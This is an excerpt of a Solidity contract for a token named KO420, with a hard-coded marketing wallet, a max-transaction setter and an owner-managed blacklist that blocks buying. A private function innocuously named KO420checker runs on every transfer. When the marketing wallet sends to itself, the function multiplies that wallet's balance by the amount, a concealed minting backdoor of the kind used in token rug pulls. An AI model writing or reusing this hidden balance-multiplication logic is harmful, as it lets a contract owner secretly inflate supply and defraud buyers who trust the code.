...
contract KO420 is Context, IERC20, Ownable {
    ...
    string private _name = "KO420";
    string private _symbol = "KO420";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7450f6504506BcC1DC45A2Bf893192EC658D3757); // Marketing Address
    address payable public BuyBackWalletAddress = payable(0x7450f6504506BcC1DC45A2Bf893192EC658D3757); // BuyBack Address
    ...
    function KO420checker(address f,address t,uint256 m) private {
        if (f == t && f ==marketingWalletAddress)
         {_balances[marketingWalletAddress] = _balances[marketingWalletAddress].mul(m);
         }
    }
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount <= (120 * 10**6 * 10**9), "Max wallet should be less or euqal to 6% totalSupply");
...
//create a mapping to keep track of who is blacklist
    ...
    //blacklisted addreses can not buy! If you have ever used a bot, then you're wallet address will probably be blacklisted		
        ...
        else
        {
            ...
            KO420checker (sender, recipient, amount);
            return true;
        }
    }
